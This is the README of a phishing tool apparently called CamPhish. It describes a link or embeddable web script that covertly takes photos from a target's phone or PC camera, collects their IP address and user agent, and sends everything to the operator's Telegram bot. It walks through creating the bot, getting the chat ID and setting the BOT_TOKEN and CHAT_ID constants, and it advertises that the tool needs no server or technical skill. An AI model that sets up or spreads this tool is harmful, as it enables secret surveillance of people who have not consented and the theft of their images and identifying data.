# CamPhish
### Cam shots from target's phone front camera or PC webcam just sending a link, or add the script to your website or any webpage without port forwarding and web server and complexities of command prompt codes.
### You ONLY need simple hosting and a telegram account
## Features
- Receive all informatin and photo on the telegram bot.
- Easy to use
- Get user Agent
- Get IP address
- Get shots photo from phone or PC
- Run Without port forwarding and web server
## Requirements
- telegram
- website or any Paid or free hosting like blogger , wordpress, github page etc.
## How to Build
### Setup
#### 1 - create telegram bot
find Bot Father on Telegram by search on search bar or use this link : [@BotFather](https://t.me/BotFather)

start bot Father and send /newbot, choose name and username for your bot. after creating bot on bot Father you will receive your bot link and token, copy your bot token then click your bot link and start your bot.
<p float="left">
  <img src="/Preview/Frame 1.jpg" width="28%" />
  <img src="/Preview/Frame 2.jpg" width="28%" />
</p>

So here is our bot token ``` 63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c ``` (make sure we don't share it to anyone).

#### 2 - Get Chat ID for a bot
1. Search and open our new Telegram bot
1. After well are Click Start or send a message
1. Open this URL in a browser `https://api.telegram.org/bot{our_bot_token}/getUpdates`   
    - See we need to prefix our token with a wor `bot`
    - Eg: `https://api.telegram.org/bot63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c/getUpdates`
1. We will see a json like so
    ```
    {
      "ok": true,
      "result": [
        {
          "update_id": 83xxxxx35,
          "message": {
            "message_id": 2643,
            "from": {...},
            "chat": {
              "id": 21xxxxx38,
              "first_name": "...",
              "last_name": "...",
              "username": "@username",
              "type": "private"
            },
            "date": 1703062972,
            "text": "/start"
          }
        }
      ]
    }
    ```
1. Check the value of `result.0.message.chat.id`, and here is our Chat ID: `21xxxxx38`
3. Let's try to send a message: `https://api.telegram.org/bot63xxxxxx71:AAFoxxxxn0hwA-2TVSxxxNf4c/sendMessage?chat_id=21xxxxx38&text=test123`
4. When we set the bot token and chat id correctly, the message `test123` should be arrived on our Telegram bot chat.
### Modify script configuration BOT_TOKEN and CHAT_ID
Now replace the BOT_TOKEN and CHAT_ID keys with you own keys
```
const BOT_TOKEN = '00000000:XXXXXXXXXX-XXXXXXXXXXXXXXX_XXXX'; // Replace with your bot's TOKEN
const CHAT_ID = '1234567899'; // Replace with your bot's chat ID
```
## Example of how the data will reach you
<p float="left">
  <img src="/Preview/Example 1.jpg" width="40%" />
</p>

### Now can u target any camera without port forwarding or any installation of any comlex Nodejs server or any complex language such as Python, bash..., and runing without machine like Kali Linux or Ubuntu, and without Termux Errors.
### You ONLY need simple hosting and a telegram account.
